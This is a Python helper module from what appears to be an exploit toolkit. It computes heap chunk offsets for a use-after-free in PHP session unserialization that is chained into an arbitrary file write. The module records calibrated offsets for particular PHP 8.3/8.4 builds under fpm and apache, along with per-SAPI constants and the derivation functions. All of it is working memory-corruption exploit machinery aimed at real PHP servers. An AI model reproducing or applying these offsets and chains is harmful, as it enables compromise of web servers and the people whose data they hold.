#!/usr/bin/env python3
# INDEX: derive singleshot E_OFF from decode anchor a_off + CARRIER_E | all | calibrated fit (gdb: version-sensitive)
"""Singleshot write-geometry reduction: E_OFF as a_off + a model-keyed stride.

The sink-free session-UAF -> file-write singleshots carry {E_OFF, ps_files_chunkoff}
as chunk-relative literals. E_OFF is expressed off two quantities already in the tree:

    E_OFF = dt_anchor(a_off, model) + CARRIER_E[model]

  a_off       chunk-relative page of the OOMing decode's re-occupiable var_dtor_entries
              block ("chunk A"; the leak chain lands its carrier at a_off+0xd8).
  dt_anchor   DT (the write chain's var_dtor_entries anchor) vs a_off, per model:
              dt_high_slot re-occupies in place (DT == a_off); fresh_dtor_block takes a
              fresh block one page below (DT == a_off - 0x1000).
  CARRIER_E   the E<->DT decode-allocation stride (geometry.carrier_e_gap), model-keyed.

ps_files_chunkoff stays a measured per-SAPI residue (fpm 0x56208, apache 0x561e0; same
page 0x56000, sub-page slot per SAPI).

Recorded calibrations (arithmetic, verify_singleshot_anchor.py):
    fpm 8.3.26  a_off 0x6a000 + 0x25000           = E 0x8f000   (dt_high_slot)
    apache 8.4  a_off 0x69000 + 0x25000           = E 0x8e000   (dt_high_slot)
    upc 8.4.26 (a_off 0x69000 - 0x1000) + 0x42000 = E 0xaa000   (fresh_dtor_block)

Stage: CALIBRATED FIT. The identity is exact at the three points above (built from them),
and with a leak a_off is recovered offset-free (read_leak.carrier_base_locate), fixing
E_OFF for that live instance. It is NOT a version invariant: gdb-seated across
8.3.26/8.4.26/8.5.11 on a fixed session decode, the var_hash geometry is version-sensitive
and arm-specific -- d/DT hold 8.3<->8.4 then jump ~0x13000 at 8.5, and the E<->DT stride
drifts ~1 page/minor -- so both the anchor drift ("~1 page/minor") and CARRIER_E are
per-(arm, build) measurements, not derived constants. The one gdb-stable invariant is
DT - d == 0x3000 (php_unserialize_data struct -> its first var_dtor_entries block). DT ==
a_off is near-definitional (a_off is the chunk's re-occupiable DT page) and holds by
re-occupation only for the chain's own arm.
"""
from primitives.geometry.carrier_e_gap import carrier_e

# DT-anchor page relative to the leak chain's a_off, per delivery model.
DT_ANCHOR_VS_AOFF = {
    "dt_high_slot": 0,            # re-occupied in place: DT == a_off
    "fresh_dtor_block": -0x1000,  # fresh block one page below the full dangling block
}

# ps_files_chunkoff residue: SAPI-keyed, version-stable across 8.3.26<->8.4.26.
# Same page (0x56000); the sub-page slot is the per-SAPI RINIT/session-open high-water.
PS_FILES_BY_SAPI = {
    "fpm": 0x56208,
    "apache": 0x561e0,
}


def dt_from_anchor(a_off, model="dt_high_slot"):
    """The var_dtor_entries (DT) chunk offset from the leak-chain anchor a_off."""
    try:
        return a_off + DT_ANCHOR_VS_AOFF[model]
    except KeyError:
        raise ValueError("unknown delivery model %r (have %s)"
                         % (model, ", ".join(sorted(DT_ANCHOR_VS_AOFF)))) from None


def e_from_anchor(a_off, model="dt_high_slot"):
    """Derive the var_entries (E) anchor E_OFF from a_off: DT(a_off, model) + CARRIER_E."""
    return dt_from_anchor(a_off, model) + carrier_e(model)


def ps_files_off(sapi):
    """The chunk-relative ps_files offset for `sapi` ('fpm' | 'apache')."""
    try:
        return PS_FILES_BY_SAPI[sapi]
    except KeyError:
        raise ValueError("no ps_files residue for sapi %r (have %s)"
                         % (sapi, ", ".join(sorted(PS_FILES_BY_SAPI)))) from None
